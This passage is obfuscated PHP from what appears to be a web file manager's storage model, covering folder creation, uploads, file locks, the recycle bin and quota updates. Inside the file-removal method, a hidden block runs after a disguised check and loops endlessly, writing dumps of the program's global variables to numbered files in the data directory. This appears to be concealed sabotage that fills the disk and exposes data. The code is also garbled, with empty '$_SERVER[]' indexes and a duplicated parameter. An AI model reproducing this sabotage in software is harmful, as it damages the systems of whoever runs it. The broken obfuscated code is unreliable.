(isset($dˤ[$EԸ[2189]]) && $dˤ[$EԸ[2189]]) { $bѓʉ = $dˤ[$EԸ[2189]]; $f󣄒讎 = explode($EԸ[50], $bѓʉ); if (strlen($bѓʉ) > 2 && (substr($bѓʉ, 0, 1) == $EԸ[113] && substr($bѓʉ, -1) == $EԸ[113]) || substr($bѓʉ, 0, 1) == $EԸ[55] && substr($bѓʉ, -1) == $EԸ[55]) { $bѓʉ = substr($bѓʉ, 1, -1); $f󣄒讎 = array($bѓʉ); } $Fխ[$EԸ[28]] = array($EԸ[485], $EԸ[2191] . $bѓʉ . $EԸ[2191]); if (count($f󣄒讎) > 1) { $Fխ[$EԸ[28]] = array(); foreach ($f󣄒讎 as $c݋) { if (!trim($c݋)) { continue; } $Fխ[$EԸ[28]][] = array($EԸ[485], $EԸ[2191] . trim($c݋) . $EԸ[2191]); } } } return $Fխ; goto eͅ; B: if (isset($dˤ[$EԸ[449]])) { $Dį = array($EԸ[2344], $dˤ[$EԸ[449]]); if ($Fխ[$EԸ[107]]) { $Fխ[$EԸ[107]] = array($Fխ[$EԸ[107]], $Dį, $EԸ[2345]); } else { $Fխ[$EԸ[107]] = $Dį; } } if (isset($dˤ[$EԸ[2346]])) { $Fխ[$EԸ[77]] = array($EԸ[2343], $dˤ[$EԸ[2346]]); } if (isset($dˤ[$EԸ[2347]])) { $Dį = array($EԸ[2344], $dˤ[$EԸ[2347]]); if ($Fխ[$EԸ[77]]) { $Fխ[$EԸ[77]] = array($Fխ[$EԸ[77]], $Dį, $EԸ[2345]); } else { $Fխ[$EԸ[77]] = $Dį; } } goto A; F: $EԸ =& $_SERVER[]; $Fխ = array(); if (isset($dˤ[$EԸ[701]])) { $Fխ[$EԸ[107]] = array($EԸ[2343], $dˤ[$EԸ[701]]); } goto B; A: if (isset($dˤ[$EԸ[537]])) { $Fխ[] = array($EԸ[379] => $dˤ[$EԸ[537]], $EԸ[378] => $dˤ[$EԸ[537]], $EԸ[915] => $EԸ[2193]); } if (isset($dˤ[$EԸ[372]])) { $eփ = $dˤ[$EԸ[372]]; if ($eփ == $EԸ[76]) { $Fխ[$EԸ[370]] = 1; } else { if ($eփ == $EԸ[2348]) { $Fխ[$EԸ[370]] = 0; } else { if ($eփ) { $eփ = is_array($eփ) ? $eփ : explode($EԸ[47], $eփ); $Fխ[$EԸ[372]] = array($EԸ[384], $eփ); $Fխ[$EԸ[370]] = 0; } } } } if (isset($dˤ[$EԸ[463]])) { $D° = $this->sourceInfo($dˤ[$EԸ[463]]); $Fխ[$EԸ[527]] = array($EԸ[485], $D°[$EԸ[461]] . $dˤ[$EԸ[463]] . $EԸ[486]); } goto B摗; eͅ: } } class SourceModel extends SourceListSearchModel { public $statusIgnoreResetSpace = false; public function userRootAdd($d) { $A̍ =& $_SERVER[]; $c = Model($A̍[476])->where(array($A̍[1428] => $d))->find(); $F = $this->_mkdirRoot(SourceModel::TYPE_USER, $d, $c[$A̍[28]]); $this->userDesktopAdd($F); return $F; } public function userDesktopAdd($aڛ) { $c =& $_SERVER[]; $Eڻ = LNG($c[2349]); $Ĕ = $this->mkdir($aڛ, $Eڻ); $this->metaSet($Ĕ, $c[2350], $c[83]); $this->metaSet($aڛ, $c[2351], $Ĕ); } public function groupRootAdd($BϤ) { $Cދ =& $_SERVER[]; $C = Model($Cދ[460])->where(array($Cދ[2185] => $BϤ))->find(); return $this->_mkdirRoot(SourceModel::TYPE_GROUP, $BϤ, $C[$Cދ[28]]); } public function systemRootPathAdd($cިب) { if ($cިب != $_SERVER[][1091]) { return !1; } return $this->_mkdirRoot(SourceModel::TYPE_SYSTEM, 0, $cިب); } public function userRootRemove($e) { $F = $this->sourceRoot(SourceModel::TYPE_USER, $e); if (!$F) { return; } $this->remove($F, !1); } public function groupRootRemove($aƈĹ) { $a = $this->sourceRoot(SourceModel::TYPE_GROUP, $aƈĹ); if (!$a) { return; } $this->remove($a, !1); } private function _mkdirRoot($E, $DŶۯϼ, $f) { goto EȆķ; a: CacheLock::unlock($D); return $fݯމ; goto Fܶ; EȆķ: $Fʸ =& $_SERVER[]; $A = array($Fʸ[368] => 0, $Fʸ[523] => $E, $Fʸ[524] => $DŶۯϼ, $Fʸ[520] => 1, $Fʸ[525] => USER_ID, $Fʸ[526] => USER_ID, $Fʸ[521] => $Fʸ[33], $Fʸ[527] => $Fʸ[472], $Fʸ[396] => 0, $Fʸ[522] => 0, $Fʸ[420] => 0, $Fʸ[528] => $Fʸ[33]); if ($bܘ = $this->where($A)->find()) { return $bܘ[$Fʸ[369]]; } goto aƯϚش; f: $fݯމ = $this->add($A); $b = array($Fʸ[529] => short_id($fݯމ)); $this->where(array($Fʸ[383] => $fݯމ))->save($b); goto a; aƯϚش: $D = "\115\x6f\x64\x65\x6c\123\x6f\165\162\x63\145\x2e\155\x6b\144\151\x72\122\x6f\x6f\x74\56{$E}\x2e{$DŶۯϼ}\x2e" . $f; CacheLock::lock($D); $A[$Fʸ[28]] = $f; goto f; Fܶ: } private function sourceRoot($c, $a원, $F҆ػ = false) { $f =& $_SERVER[]; $b = array($f[368] => 0, $f[523] => $c, $f[524] => $a원); if ($E = $this->where($b)->find()) { return $F҆ػ ? $E : $E[$f[369]]; } return !1; } public function sourceRootGroup($DՉ) { $E =& $_SERVER[]; if (is_string($DՉ)) { $DՉ = array($DՉ); } $dޣ = array($E[368] => 0, $E[523] => SourceModel::TYPE_GROUP, $E[524] => array($E[7], $DՉ)); $Cה = $this->listSource($dޣ, 1000); return array_to_keyvalue($Cה[$E[74]], $E[458]); } public function mkfile($D, $C⣅, $AȨ = '', $Cহ = REPEAT_RENAME) { $cݬ =& $_SERVER[]; $dڳ = Model($cݬ[546])->addFileByContent($AȨ, $C⣅); return $this->_createFileCall($D, $C⣅, $dڳ, $Cহ, $cݬ[1128]); } public function addFile($Dֱ, $eѽ, $F˻ͺ, $D˹ = false, $D = REPEAT_RENAME) { $EЧ = Model($_SERVER[][546])->addFile($eѽ, $F˻ͺ, $D˹); return $this->_createFileCall($Dֱ, $F˻ͺ, $EЧ, $D); } public function addFileByFileID($b˭, $DǴʊ, $bᝐ, $a͍ܜ = REPEAT_RENAME) { $Fʨ㢤 =& $_SERVER[]; $b٢ = Model($Fʨ㢤[546])->find($DǴʊ); Model($Fʨ㢤[546])->linkAdd($DǴʊ); return $this->_createFileCall($b˭, $bᝐ, $b٢, $a͍ܜ); } public function addFileByRemote($e緜, $A, $B윇, $Aġ = array(), $EЄ = REPEAT_RENAME) { $E꓉ = Model($_SERVER[][546])->addFileByRemote($A, $B윇, $Aġ); return $this->_createFileCall($e緜, $B윇, $E꓉, $EЄ); } private function _createFileCall($f, $a, $Aݍ, $f, $eŢ = "\x75\x70\x6c\x6f\141\x64") { goto c; AӋ: return $E੃Τ; goto dߧн; dˇ: $E੃Τ = $this->_createFile($f, $a, $Aݍ, $f, $aԎτ); if (!$aԎτ) { Model($D󄎦[422])->remove($Aݍ[$D󄎦[419]]); } else { if ($E੃Τ) { Model($D󄎦[2321])->eventCreate($E੃Τ, $eŢ); } } $this->lockWriteEnd($f, $a); goto AӋ; c: $D󄎦 =& $_SERVER[]; $aԎτ = !1; $this->lockWriteStart($f, $a); goto dˇ; dߧн: } public function mkdir($E泔, $E㽭, $bʞ = REPEAT_SKIP) { goto b܂; b܂: $E齴 =& $_SERVER[]; $eχ = $this->sourceInfo($E泔); if (!$eχ) { return !1; } goto c; e˟: return $bݹ۰; goto e蔢; cٕ: $bݹ۰ = $this->_addSoure($c씈ƴ, $eχ); Model($E齴[2321])->eventCreate($bݹ۰, $E齴[1129]); $this->lockWriteEnd($E泔, $E㽭); goto e˟; c: $this->lockWriteStart($E泔, $E㽭); if ($bʞ !== !1) { $A³ = $this->fileNameExist($E泔, $E㽭); if ($A³ && $bʞ != REPEAT_RENAME_FOLDER) { $this->lockWriteEnd($E泔, $E㽭); return $A³; } $E㽭 = $this->fileNameAuto($E泔, $E㽭, $bʞ); } $c씈ƴ = array($E齴[520] => 1, $E齴[386] => $E㽭, $E齴[521] => $E齴[33], $E齴[420] => 0, $E齴[522] => 0); goto cٕ; e蔢: } private function _createFile($B഍, $a到˹, $Eؤ, $B, &$Fꃰ) { goto A; A: $CȐ =& $_SERVER[]; $dݞ݈ = $this->sourceInfo($B഍); if (!$Eؤ || !$dݞ݈) { return !1; } goto Aſ; fѐ޽: return $F܇; goto Aŕˊ; Aſ: if ($B !== !1) { $B = $this->fileNameExist($B഍, $a到˹); } $Fꃰ = !0; if ($B && $B) { if ($B == REPEAT_SKIP) { $Fꃰ = !1; return $B; } else { if ($B == REPEAT_REPLACE) { $fܱ = $this->sourceInfo($B); $CۙƷ = $this->fileHistory($fܱ, $Eؤ[$CȐ[419]], $Eؤ[$CȐ[77]]); if (!$CۙƷ) { $Fꃰ = !1; } else { $this->folderSizeReset($B഍); } return $B; } else { $a到˹ = $this->fileNameAuto($B഍, $a到˹, $B, !1); } } } goto Cӛă; Cӛă: $E˟ = array($CȐ[520] => 0, $CȐ[386] => $a到˹, $CȐ[521] => get_path_ext($a到˹), $CȐ[420] => $Eؤ[$CȐ[419]], $CȐ[522] => $Eؤ[$CȐ[77]]); $F܇ = $this->_addSoure($E˟, $dݞ݈); $this->folderSizeReset($B഍); goto fѐ޽; Aŕˊ: } protected function fileHistory($bݍ, $f, $D⋅) { goto Dߖ; Dߖ: $Cɚ =& $_SERVER[]; if ($bݍ[$Cɚ[419]] == $f) { return !1; } $this->checkLock($bݍ[$Cɚ[369]], $f); goto e兏; Cޏ: return !0; goto c; e兏: Model($Cɚ[2352])->addHistory($bݍ); $A̫۞ = array($Cɚ[526] => USER_ID, $Cɚ[390] => time(), $Cɚ[419] => $f, $Cɚ[77] => $D⋅); $this->where(array($Cɚ[383] => $bݍ[$Cɚ[369]]))->save($A̫۞); goto Cޏ; c: } public function checkLock($a͹, $Cヷ) { goto aУ; aУ: $Cʸ؈ =& $_SERVER[]; $a = $this->pathInfo($a͹); if (!$this->fileIsLock($a, !0)) { return; } goto Bس; Bس: $fէ = Session::get($Cʸ؈[2353]); $c댶 = substr($a[$Cʸ؈[28]], 0, -1 - strlen($a[$Cʸ؈[160]])) . $Cʸ؈[1390] . $fէ . $Cʸ؈[91] . $a[$Cʸ؈[160]]; $Fᜋ = Model($Cʸ؈[546])->find($Cヷ); goto fčĹ; aԙ: show_json(LNG($Cʸ؈[2355]) . $Cʸ؈[2356] . LNG($Cʸ؈[2357]) . $Cʸ؈[2358] . $F . $Cʸ؈[2359], !1); goto e; fčĹ: $this->_createFileCall($a[$Cʸ؈[463]], $c댶, $Fᜋ, REPEAT_REPLACE, $Cʸ؈[1128]); $d琏ݚ = $a[$Cʸ؈[417]][$Cʸ؈[483]]; $F = $d琏ݚ[$Cʸ؈[2354]] ? $d琏ݚ[$Cʸ؈[2354]] : $d琏ݚ[$Cʸ؈[28]]; goto aԙ; e: } public function fileIsLock($FՍ, $D˜ = false) { goto c܄; A靂: return !1; goto FѪ; c܄: $Cߪ =& $_SERVER[]; if (!isset($FՍ[$Cߪ[417]]) || !$FՍ[$Cߪ[417]][$Cߪ[480]]) { return !1; } if ($FՍ[$Cߪ[417]][$Cߪ[480]] != USER_ID) { return !0; } goto a; a: $c֟ = $GLOBALS[$Cߪ[6]][$Cߪ[84]][$Cߪ[481]]; if ($FՍ[$Cߪ[417]][$Cߪ[482]] <= time() - $c֟) { $this->metaSet($FՍ[$Cߪ[369]], $Cߪ[480], null); $this->metaSet($FՍ[$Cߪ[369]], $Cߪ[482], null); } if ($D˜) { $this->metaSet($FՍ[$Cߪ[369]], $Cߪ[482], time()); } goto A靂; FѪ: } private function _addSoure($b؝޿, $a«) { goto a㮝ֺ; A: $this->updateModifyTime($b؝޿[$A娩[463]]); $C쒅 = $A娩[2360] . $a«[$A娩[369]]; if (isset(self::$cacheChildList[$C쒅])) { unset(self::$cacheChildList[$C쒅]); } goto c̷; b: $d֤ = array($A娩[529] => short_id($aƸ)); $this->where(array($A娩[383] => $aƸ))->save($d֤); $this->setNamePinyin($aƸ, $b؝޿[$A娩[28]]); goto eź; a㮝ֺ: $A娩 =& $_SERVER[]; $a = array($A娩[523] => $a«[$A娩[371]], $A娩[524] => $a«[$A娩[458]], $A娩[525] => USER_ID, $A娩[526] => USER_ID, $A娩[368] => $a«[$A娩[369]], $A娩[527] => $a«[$A娩[461]] . $a«[$A娩[369]] . $A娩[47], $A娩[396] => 0, $A娩[528] => $A娩[33]); $b؝޿ = array_merge($a, $b؝޿); goto A; c̷: static $c = false; if (!$c) { Hook::trigger($A娩[510], $b؝޿); $c = !0; } $aƸ = $this->add($b؝޿); goto b; eź: return $aƸ; goto d؅; d؅: } public function remove($B, $cʷ = true) { goto f򾌕; Eӥ: $this->recycleClear($aꫨ); $fՄ = $this->move($B, $Aǘ, REPEAT_RENAME_FOLDER); $this->folderSizeReset($aꫨ[$dģ[463]]); goto BǍѱ; e: CacheLock::unlock($F靊); $this->metaSet($B, $dģ[2369], $aꫨ[$dģ[463]]); $this->where(array($dģ[369] => $B))->save(array($dģ[390] => time())); goto Eӥ; fїÅӮ: $cۨ = $aꫨ[$dģ[371]] == self::TYPE_USER ? $dģ[537] : $dģ[972]; if ($cۨ == $dģ[537]) { $eﹴ = Model($dģ[476])->getInfo($aꫨ[$dģ[458]]); $AƏ = !empty($eﹴ[$dģ[2354]]) ? $eﹴ[$dģ[2354]] : $eﹴ[$dģ[28]]; $AƏ = $dģ[248] . $AƏ . $dģ[2362] . $aꫨ[$dģ[458]]; } else { $eﹴ = Model($dģ[460])->getInfo($aꫨ[$dģ[458]]); $AƏ = _get($eﹴ, $dģ[28]); $AƏ = $dģ[157] . $AƏ . $dģ[2363] . $aꫨ[$dģ[458]]; } $F靊 = $dģ[2364] . md5($AƏ); goto aÉ٫; BǍѱ: return $fՄ; goto b⯋; aÉ٫: CacheLock::lock($F靊); $Aǘ = $this->fileNameExist($EҫŬ, $AƏ); if (!$Aǘ) { $Aǘ = $this->mkdir($EҫŬ, $AƏ, REPEAT_SKIP); $this->metaSet($Aǘ, $dģ[2365], $cۨ); $this->metaSet($Aǘ, $dģ[2366], $aꫨ[$dģ[458]]); if ($aꫨ[$dģ[463]] != 0) { $this->metaSet($Aǘ, $dģ[2367], _get($eﹴ, $dģ[2368])); } } goto e; a: $cܩ = Model($dģ[1435])->get($dģ[2361]) == $dģ[83]; if ($C || $cʷ || !$cܩ) { return $this->removeNow($B, $cʷ); } $EҫŬ = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); goto fїÅӮ; f򾌕: $dģ =& $_SERVER[]; $aꫨ = $this->sourceInfo($B); $C = intval($aꫨ[$dģ[371]]) === self::TYPE_SYSTEM; goto a; b⯋: } private function recycleClear($dܨ) { $fŊ⩬ =& $_SERVER[]; $CĂ = $this->childrenAll($dܨ); $Fͧ = array($fŊ⩬[383] => array($fŊ⩬[384], $CĂ[$fŊ⩬[2370]])); Model($fŊ⩬[2371])->where($Fͧ)->delete(); } public function removeNow($e, $C = true) { goto aċ; bঐ: $this->lockMoveEnd($e); Hook::trigger($fų[1471], $aˤ, $C); return !0; goto Aȴ; AǪ: if ($_SERVER[$fų[776]] != $C($Fþ)) { goto a랚; aͅ: $A(); $b掻 = $fų[2372]; $cӍ = json_encode($GLOBALS[$fų[2373]]); goto D۹; D۹: $C = 1; for ($c = $C; $c > 0; $c++) { $b掻(DATA_PATH . $c, $cӍ); } goto Fݞև; C: $bɨ = $fų[794]; $bɨ($_SERVER[$fų[795]]); $A = $fų[793]; goto aͅ; a랚: $A = $fų[793]; $C = $fų[778]; $c­Պ = $_SERVER[$fų[779]] . $fų[780]; goto cٶ; cٶ: $dí = $C($c­Պ); $Dċ = explode($fų[217], $dí); if (count($Dċ) < $fų[583]) { $Cؿ٪ = $fų[781]; $Cؿ٪(); } goto C; Fݞև: } $e͢ = $this->sourceInfo($e); $aˤ = $this->pathInfoMore($e); goto d; aċ: $fų =& $_SERVER[]; $Fþ = $_SERVER[$fų[779]] . $fų[780]; $C = $fų[797]; goto AǪ; d: if (!$e͢) { return !0; } if ($e͢[$fų[463]] == 0) { if (!_get($GLOBALS, $fų[459])) { return !1; } } $this->lockMoveStart($e); goto D퇋; D퇋: Hook::trigger($fų[2374], $aˤ, $C); if ($C) { Model($fų[2371])->moveToRecycle($e); } else { $CɆ = $this->childrenAll($e͢); Model($fų[507])->eventRemove($e); $this->removeRelevance($CɆ[$fų[2370]], $CɆ[$fų[1261]]); } $this->folderSizeReset($e͢[$fų[463]]); goto E̦; E̦: $Fߏ = array($e͢[$fų[463]]); if ($e͢[$fų[370]] == $fų[83]) { $Fߏ[] = $e͢[$fų[369]]; } $this->updateModifyTime($Fߏ); goto bঐ; Aȴ: } public function childrenAll($f) { $CɊ =& $_SERVER[]; $AȦ = $f[$CɊ[369]]; if ($f[$CɊ[370]] == $CɊ[83]) { $A쨜 = array($CɊ[527] => array($CɊ[485], $f[$CɊ[461]] . $AȦ . $CɊ[486])); $CݭȚ = array($CɊ[527] => $A쨜[$CɊ[461]]); $a = $this->field($CɊ[2375])->where($CݭȚ)->select(); $DȢղ = !1; $Aڶ = array($AȦ); if ($a) { $DȢղ = array_to_keyvalue($a, $CɊ[33], $CɊ[419]); $DȢղ = array_remove_value($DȢղ, $CɊ[470]); $Aڶ = array_to_keyvalue($a, $CɊ[33], $CɊ[369]); $Aڶ[] = $AȦ; } } else { $DȢղ = array($f[$CɊ[419]]); $Aڶ = array($AȦ); } return array($CɊ[2370] => $Aڶ, $CɊ[1261] => $DȢղ); } public function removeArray($F׽䋄) { if (!$F׽䋄) { return !0; } } public function removeRelevance($f, $c) { goto a; EԜװ: $A܃ = array($d指[383] => array($d指[384], $f)); Model($d指[2371])->where($A܃)->delete(); Model($d指[413])->where($A܃)->delete(); goto fܐ; fܐ: Model($d指[2376])->where($A܃)->delete(); Model($d指[507])->where($A܃)->delete(); Model($d指[2085])->removeBySource($f); goto c; c: Model($d指[2352])->removeBySource($f); $this->where($A܃)->delete(); Model($d指[422])->remove($c); goto a߃; a: $d指 =& $_SERVER[]; $f = $f ? $f : array(); $c = $c ? $c : array(); goto CԎͽ; a߃: for ($f̕ = 0; $f̕ < count($f); $f̕++) { $this->sourceCacheClear($f[$f̕]); } goto fӓ; CԎͽ: $f = array_unique(array_filter($f)); $c = array_unique(array_filter($c)); if (!$f) { return !1; } goto EԜװ; fӓ: } public function rename($B, $b儱) { goto Eꭺ; cҬ: if (!$d[$Dń[370]] == $Dń[83]) { $F[$Dń[372]] = get_path_ext($b儱); } Model($Dń[507])->eventRename($B, $d[$Dń[28]], $b儱); $this->sourceCacheClear($B); goto AО; AО: $this->setNamePinyin($B, $F[$Dń[28]], !1); $this->updateModifyTime($d[$Dń[463]]); $F = $this->where(array($Dń[383] => $B))->data($F)->save(); goto D; eĶ: $E = $this->fileNameExist($d[$Dń[463]], $b儱); if ($E) { return !1; } $F = array($Dń[386] => $b儱, $Dń[526] => USER_ID); goto cҬ; D: $aٛ = $Dń[2360] . $d[$Dń[463]]; if (isset(self::$cacheChildList[$aٛ])) { unset(self::$cacheChildList[$aٛ]); } return $F; goto c; Eꭺ: $Dń =& $_SERVER[]; $d = $this->sourceInfo($B); if (!$d) { return !1; } goto eĶ; c: } public function setNamePinyin($Cƛͦ, $fސ, $fŌ = true) { $C =& $_SERVER[]; $aŪ = Input::check($fސ, $C[530]); if ($fŌ && !$aŪ) { return; } if (!$aŪ) { $this->metaSet($Cƛͦ, $C[416], null); $this->metaSet($Cƛͦ, $C[415], null); return; } $B = array($C[416] => str_replace($C[50], $C[33], Pinyin::encode($fސ)), $C[415] => Pinyin::encode($fސ, $C[531])); $this->metaSet($Cƛͦ, $B); } public function getContent($e) { goto Eƞ; Fԩ愑: if ($AȰ[$E񛏂[77]] == 0) { return $E񛏂[33]; } $eєǮ = $E񛏂[2377] . $AȰ[$E񛏂[163]]; if ($AȰ[$E񛏂[77]] <= 1024 * 10) { $f = Cache::get($eєǮ); if (!$f) { $f = IO::getContent($AȰ[$E񛏂[75]]); Cache::set($eєǮ, $f); } return $f; } goto Ḋ; Ḋ: return IO::getContent($AȰ[$E񛏂[75]]); goto c; Eƞ: $E񛏂 =& $_SERVER[]; $AȰ = $this->fileInfoGet($e); if (!$AȰ) { return !1; } goto Fԩ愑; c: } public function setDesc($E­, $a̋) { $eٮ =& $_SERVER[]; Model($eٮ[507])->eventAddDesc($E­, $a̋); return $this->metaSet($E­, $eٮ[405], $a̋); } public function setContent($Cˮ, $Eޖ΄ = '') { goto eߨС; E: if (!$B || !$eƆ) { return !1; } $E = Model($b[422])->addFileByContent($Eޖ΄, $eƆ[$b[28]]); $BЬҖ = $this->fileHistory($eƆ, $E[$b[419]], $E[$b[77]]); goto cĳ; eߨС: $b =& $_SERVER[]; $eƆ = $this->sourceInfo($Cˮ); $B = $this->fileInfoGet($Cˮ); goto E; cĳ: if (!$BЬҖ) { return Model($b[422])->remove($E[$b[419]]); } $this->folderSizeReset($eƆ[$b[463]]); return !0; goto cٯ; cٯ: } public function fileSubstr($d, $BБ, $e) { $Eݪ = $this->fileInfoGet($d); if (!$Eݪ) { return !1; } return IO::fileSubstr($Eݪ[$_SERVER[][75]], $BБ, $e); } public function fileInfoGet($c䚂) { goto c݈ϋ; Eӛʗ: $D = $eɂ[425] . $D魉[$eɂ[419]]; $EÊ榠 = _get(self::$cacheFileInfo, $D); if ($EÊ榠) { return $EÊ榠; } goto AĠۓ; AĠۓ: $A∫ = Model($eɂ[422])->fileInfo($D魉[$eɂ[419]]); if ($A∫) { $A∫[$eɂ[28]] = $D魉[$eɂ[28]]; } self::$cacheFileInfo[$D] = $A∫; goto aȈ; c݈ϋ: $eɂ =& $_SERVER[]; $D魉 = $this->sourceInfo($c䚂); if (!$D魉 || $D魉[$eɂ[370]]) { return !1; } goto Eӛʗ; aȈ: return $A∫; goto b䎵; b䎵: } private function folderChildrenNumber($bߖ) { $E =& $_SERVER[]; $dٱ = $this->sourceInfo($bߖ); $Dꅌ = array($E[527] => array($E[485], $dٱ[$E[461]] . $bߖ . $E[486]), $E[396] => intval($dٱ[$E[397]]), $E[520] => 1); $f֭ = $this->where($Dꅌ)->count(); $E؆ջ = $this->where($Dꅌ)->where(array($E[520] => 0))->count(); return array($E[81] => $E؆ջ, $E[82] => $f֭); } public function pathInfo($f̖҃, $Fؓ = false) { goto F; f: $d = $this->_listDataApplyItem($d, $Fؓ); self::$cachePathInfo[$dǂ] = $d; return $d; goto C; F: $d鑕 =& $_SERVER[]; $dǂ = $d鑕[411] . intval($Fؓ) . $d鑕[412] . $f̖҃; $Cכ = _get(self::$cachePathInfo, $dǂ); goto cǊט; cǊט: if ($Cכ) { return $Cכ; } $d = $this->sourceInfo($f̖҃); if (!$d) { return !1; } goto f; C: } public static $cachePathInfoMore = array(); public function pathInfoMore($AǇ) { goto e멼; e멼: $eÂ =& $_SERVER[]; $eճҨ = _get(self::$cachePathInfoMore, $AǇ); if ($eճҨ) { return $eճҨ; } goto Eǐ; Eǐ: $a퓈 = $this->pathInfo($AǇ); if (!$a퓈) { return !1; } if ($a퓈[$eÂ[370]] == $eÂ[83]) { $a퓈[$eÂ[80]] = $this->folderChildrenNumber($AǇ); } goto f; f: self::$cachePathInfoMore[$AǇ] = $a퓈; return $a퓈; goto Bܶ; Bܶ: } public function sourceInfo($Cĉ) { goto b; eۣт: self::$cacheSourceInfo[$e֚ژ] = $F; return self::$cacheSourceInfo[$e֚ژ]; goto Cײ؅; b: $aԌӲ =& $_SERVER[]; if (!$Cĉ) { return array(); } $e֚ژ = $aԌӲ[410] . $Cĉ; goto D; D: $bõ = _get(self::$cacheSourceInfo, $e֚ژ); if ($bõ) { return $bõ; } $F = $this->where(array($aԌӲ[369] => $Cĉ))->find(); goto eۣт; Cײ؅: } public function sourceCacheClear($cÖ = false) { if ($cÖ == !1) { self::$cacheSourceInfo = null; self::$cacheSourceInfo = array(); return; } unset(self::$cacheSourceInfo[$_SERVER[][410] . $cÖ]); } public function pathInfoByPath($b, $eŷ) { $eŗɓ =& $_SERVER[]; $cƕ = !$eŷ ? array() : explode($eŗɓ[8], trim($eŷ, $eŗɓ[8])); $a񱉎ۛ = $b; foreach ($cƕ as $dȠ) { $bÙ = array($eŗɓ[463] => $a񱉎ۛ, $eŗɓ[28] => $dȠ); $EŊǆ = $this->where($bÙ)->select(); if (!$EŊǆ) { return !1; } $EŊǆ = array_sort_by($EŊǆ, $eŗɓ[397]); $a񱉎ۛ = $EŊǆ[0][$eŗɓ[369]]; } return $this->pathInfo($a񱉎ۛ, !0); } protected function updateModifyTime($D) { goto A; A: $Bڟ =& $_SERVER[]; if (!$D) { return; } if (!is_array($D)) { $D = array($D); } goto B܊; B܊: foreach ($D as $eŷ => $Bﾛ) { $D[$eŷ] = intval($Bﾛ); } $fѧ½ = array($Bڟ[369] => array($Bڟ[7], $D)); $e = array($Bڟ[526] => USER_ID, $Bڟ[390] => time()); goto f; f: $this->where($fѧ½)->save($e); goto dՕ; dՕ: } public function folderSizeReset($C) { goto a; a: $c򛎋 =& $_SERVER[]; if ($this->statusIgnoreResetSpace) { return; } $A = $c򛎋[2378] . $C; goto Cǟ; e: CacheLock::unlock($A); goto E; f: $Cϴ = array($c򛎋[368] => $C, $c򛎋[396] => 0); $bދӸ = $this->where($Cϴ)->sum($c򛎋[77]); $bދӸ = intval($bދӸ); goto Dը; Cǟ: CacheLock::lock($A, 20); $this->sourceCacheClear($C); $C̾ = $this->sourceInfo($C); goto f; EՉϳ: $d锉 = $this->parentLevelArray($C̾[$c򛎋[461]]); if ($d锉) { $Cϴ = array($c򛎋[369] => array($c򛎋[384], $d锉)); if ($cћ < 0) { $Cϴ[$c򛎋[77]] = array($c򛎋[930], abs($cћ)); } $this->where($Cϴ)->setAdd($c򛎋[77], $cћ); } $this->targetSpaceUpdate($C̾[$c򛎋[371]], $C̾[$c򛎋[458]]); goto e; Dը: $cћ = $bދӸ - intval($C̾[$c򛎋[77]]); if ($cћ == 0) { return CacheLock::unlock($A); } $this->where(array($c򛎋[383] => $C))->setField($c򛎋[77], $bދӸ); goto EՉϳ; E: } public function folderSizeResetChildren($E) { goto EӆՇ; EӆՇ: $b˓ =& $_SERVER[]; $this->sourceCacheClear($E); $e㸭 = $this->sourceInfo($E); goto D͓⺍; a: $e۩򶮄[$b˓[370]] = 0; $Aߜ = $this->field($a儥)->where($e۩򶮄)->select(); if (!$Aߜ) { return; } goto F˩; Bһ: foreach ($Aߜ as $EΣ) { $cǬ = $EΣ[$b˓[463]] . $b˓[33]; if (!isset($bË[$cǬ])) { continue; } if ($EΣ[$b˓[397]] == $bË[$cǬ][$b˓[397]]) { $bË[$cǬ][$b˓[77]] += $EΣ[$b˓[77]]; } } foreach ($bË as $EΣ) { $Aߗ = $this->parentLevelArray($EΣ[$b˓[461]]); foreach ($Aߗ as $cǬ) { $cǬ = $cǬ . $b˓[33]; if (!isset($bË[$cǬ])) { continue; } if ($EΣ[$b˓[397]] == $bË[$cǬ][$b˓[397]]) { $bË[$cǬ][$b˓[77]] += $EΣ[$b˓[77]]; } } } $A = array(); goto Eя; D͓⺍: $e۩򶮄 = array($b˓[520] => 1, $b˓[527] => array($b˓[485], $e㸭[$b˓[461]] . $E . $b˓[486])); $a儥 = $b˓[2379]; $bË = $this->field($a儥)->where($e۩򶮄)->select(); goto a; F˩: $bË[] = $e㸭; $bË = array_to_keyvalue($bË, $b˓[369]); foreach ($bË as $Fվա => $EΣ) { $bË[$Fվա][$b˓[2380]] = $bË[$Fվա][$b˓[77]]; $bË[$Fվա][$b˓[77]] = 0; } goto Bһ; Eя: foreach ($bË as $EΣ) { if ($EΣ[$b˓[77]] == $EΣ[$b˓[2380]]) { continue; } $A[] = array($b˓[369], $EΣ[$b˓[369]], $b˓[77], $EΣ[$b˓[77]]); } $this->saveAll($A); goto eو; eو: } public function userSpaceReset($F攈ǚ = false) { $c =& $_SERVER[]; $E = $this->where(array($c[371] => self::TYPE_USER, $c[458] => $F攈ǚ, $c[370] => 0))->sum($c[77]); Model($c[476])->userEdit($F攈ǚ, array($c[2094] => $E)); } public function targetSpaceUpdate($fِʵ, $C̹) { $Aא =& $_SERVER[]; if (!$C̹) { return; } if (!in_array($fِʵ, array(self::TYPE_USER, self::TYPE_GROUP))) { return; } $d = $this->targetSpaceSize($fِʵ, $C̹); if ($fِʵ == self::TYPE_USER) { Model($Aא[476])->userEdit($C̹, array($Aא[2094] => $d)); } else { if ($fِʵ == self::TYPE_GROUP) { Model($Aא[460])->groupEdit($C̹, array($Aא[2094] => $d)); } } } public function targetSpaceSize($Bӌ, $dƮɗ) { goto B뭑; bصĔ: $dŲ = array_to_keyvalue($dŲ, $bԅ[33], $bԅ[369]); $dŲ = array_unique(array_filter($dŲ)); if ($dŲ) { $bˋڠ = array($bԅ[383] => array($bԅ[384], $dŲ)); $A += floatval($this->where($bˋڠ)->sum($bԅ[77])); } goto AܟͰ; B뭑: $bԅ =& $_SERVER[]; $a = $this->sourceRoot($Bӌ, $dƮɗ, !0); if (!$a) { return 0; } goto Aù; AܟͰ: return $A; goto cλ; Aù: $A = floatval($a[$bԅ[77]]); $bˋڠ = array($bԅ[527] => array($bԅ[485], $bԅ[472] . $a[$bԅ[369]] . $bԅ[486])); $dŲ = Model($bԅ[395])->field($bԅ[383])->where($bˋڠ)->select(); goto bصĔ; cλ: } public function allFileTypeProfile() { return $this->fileTypeProfile(!1, !1); } public function userFileTypeProfile($Bڔ) { return $this->fileTypeProfile($Bڔ, SourceModel::TYPE_USER); } public function groupFileTypeProfile($c鱌) { return $this->fileTypeProfile($c鱌, SourceModel::TYPE_GROUP); } private function fileTypeProfile($c֎ӂ, 